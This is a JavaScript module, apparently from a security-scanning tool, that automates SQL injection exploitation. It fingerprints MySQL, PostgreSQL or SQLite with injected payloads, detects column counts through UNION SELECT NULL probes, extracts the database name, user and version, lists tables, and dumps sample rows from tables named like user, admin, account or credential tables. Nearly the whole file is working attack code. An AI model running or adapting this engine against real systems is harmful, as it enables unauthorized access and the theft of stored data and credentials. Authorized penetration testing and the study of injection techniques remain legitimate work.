'use strict';

/**
 * SQLMAP Engine — Deep SQLi Exploitation
 * =====================================
 * Automates:
 * 1. Fingerprinting (MySQL vs PostgreSQL vs SQLite)
 * 2. Column Detection (UNION SELECT NULL...)
 * 3. Data Extraction (DB Name, Tables, User, Version)
 */

class SqlmapEngine {
  constructor() {}

  async exploit(finding, testingEngine, log) {
    const { endpoint, param, payload } = finding;
    log('ELITE', `🔍 Starting SQLMAP deep extraction on ${param}...`);

    const baseline = await testingEngine.establishBaseline(finding);
    const dialect = await this.fingerprint(finding, testingEngine, log);
    
    if (dialect) {
       log('ELITE', `🔓 DB Fingerprint detected: ${dialect.toUpperCase()}`);
       const colCount = await this.detectColumns(finding, testingEngine, log);
       
       if (colCount) {
          log('ELITE', `🔓 Column count confirmed: ${colCount}`);
          const pillarData = await this.extractPillarData(finding, testingEngine, colCount, dialect, log);
          return { dialect, colCount, ...pillarData };
       }
    }
    
    return null;
  }

  async fingerprint(finding, testingEngine, log) {
    const tests = [
      { name: 'sqlite', payload: "' AND sqlite_version()='sqlite'--", sign: /sqlite/i },
      { name: 'mysql',  payload: "' AND @@version LIKE '%MySQL%'--",   sign: /mysql/i },
      { name: 'pgsql',  payload: "' AND version() LIKE '%PostgreSQL%'--", sign: /postgresql/i }
    ];

    for (const test of tests) {
       const mutated = this.mutate(finding, test.payload);
       const res = await testingEngine.sendMeasuredRequest(mutated);
       if (res && (res.status === 200 || test.sign.test(res.body))) return test.name;
    }
    return 'generic';
  }

  async detectColumns(finding, testingEngine, log) {
    for (let i = 1; i <= 15; i++) {
       const nulls = Array(i).fill('NULL').join(',');
       const payload = `' UNION SELECT ${nulls}--`;
       const mutated = this.mutate(finding, payload);
       const res = await testingEngine.sendMeasuredRequest(mutated);
       
       // Success is usually when status is 200 and no "different number of columns" error
       if (res && res.status === 200 && !/columns|union/i.test(res.body)) {
          return i;
       }
    }
    return null;
  }

  async extractPillarData(finding, testingEngine, colCount, dialect, log) {
    const data = { tables: [], rows: [] };
    const functions = {
       mysql: { db: 'DATABASE()', user: 'USER()', ver: 'VERSION()', tables: 'table_name', schema: 'information_schema.tables' },
       pgsql: { db: 'current_database()', user: 'current_user', ver: 'version()', tables: 'relname', schema: 'pg_stat_user_tables' },
       generic: { db: 'DB_NAME()', user: 'USER', ver: '@@VERSION', tables: 'name', schema: 'sysobjects' }
    };

    const fn = functions[dialect] || functions.generic;
    
    // 1. Extract DB, User, Version
    const metadataFields = [fn.db, fn.user, fn.ver];
    for (let i = 0; i < metadataFields.length; i++) {
      const payload = `' UNION SELECT ${metadataFields[i]},${Array(colCount-1).fill('NULL').join(',')}--`;
      const res = await testingEngine.sendMeasuredRequest(this.mutate(finding, payload));
      if (res && res.status === 200) {
        const val = this.extractString(res.body);
        if (i === 0) data.database = val;
        if (i === 1) data.user = val;
        if (i === 2) data.version = val;
      }
    }

    // 2. Extract Tables (Limit 3)
    log('ELITE', `💉 Attempting table extraction (Limit 3)...`);
    const tablePayload = dialect === 'mysql' 
      ? `' UNION SELECT group_concat(table_name),${Array(colCount-1).fill('NULL').join(',')} FROM information_schema.tables WHERE table_schema=database() LIMIT 3--`
      : `' UNION SELECT ${fn.tables},${Array(colCount-1).fill('NULL').join(',')} FROM ${fn.schema} LIMIT 3--`;

    const tRes = await testingEngine.sendMeasuredRequest(this.mutate(finding, tablePayload));
    if (tRes && tRes.status === 200) {
      const extracted = this.extractString(tRes.body);
      if (extracted) data.tables = extracted.split(',').map(t => t.trim()).slice(0, 3);
    }

    // 3. Extract Rows (Limit 5 from first interesting table)
    const targetTable = data.tables.find(t => /user|admin|account|cred/i.test(t)) || data.tables[0];
    if (targetTable) {
      log('ELITE', `💉 Dumping rows from high-value table: ${targetTable} (Limit 5)...`);
      const rowPayload = `' UNION SELECT * FROM ${targetTable} LIMIT 5--`;
      const rRes = await testingEngine.sendMeasuredRequest(this.mutate(finding, rowPayload));
      if (rRes && rRes.status === 200) {
        data.sample_rows = this.extractRows(rRes.body);
      }
    }

    return data;
  }

  extractRows(body) {
    // Advanced row extraction: find common delimiters or table structures
    const rows = [];
    const textBlocks = body.match(/>([^<]{2,})</g) || [];
    let currentRow = [];
    textBlocks.forEach(block => {
      const clean = block.slice(1, -1).trim();
      if (clean.length > 0 && !clean.includes('{') && !clean.includes('}')) {
        currentRow.push(clean);
        if (currentRow.length >= 3) {
          rows.push(currentRow.join(' | '));
          currentRow = [];
        }
      }
    });
    return rows.slice(0, 5);
  }

  mutate(finding, payload) {
    const cloned = JSON.parse(JSON.stringify(finding));
    cloned.method = finding.method || 'GET';
    cloned.url = finding.endpoint;
    try {
        cloned.headers = JSON.parse(finding.request_data).headers || {};
    } catch (e) {
        cloned.headers = {};
    }
    
    // Apply mutation safely using URL parameters formatting
    if (finding.param) {
       try {
           const urlObj = new URL(cloned.url.startsWith('http') ? cloned.url : `http://localhost${cloned.url}`);
           if (urlObj.searchParams.has(finding.param)) {
               urlObj.searchParams.set(finding.param, payload);
               cloned.url = urlObj.pathname + urlObj.search;
           } else if (cloned.body) {
               const bodyParams = new URLSearchParams(cloned.body);
               if (bodyParams.has(finding.param)) {
                   bodyParams.set(finding.param, payload);
                   cloned.body = bodyParams.toString();
               }
           }
       } catch (e) {
           // Fallback if URL parsing fails
           cloned.url = cloned.url.replace(new RegExp(`${finding.param}=[^&]*`), `${finding.param}=${encodeURIComponent(payload)}`);
       }
    }
    return cloned;
  }

  extractString(body) {
     // Naive extractor: look for strings in the response that don't look like HTML
     const matches = body.match(/>([^<]{3,})</g);
     if (matches) {
        return matches.map(m => m.slice(1, -1).trim()).filter(s => s.length > 2)[0];
     }
     return null;
  }
}

module.exports = new SqlmapEngine();
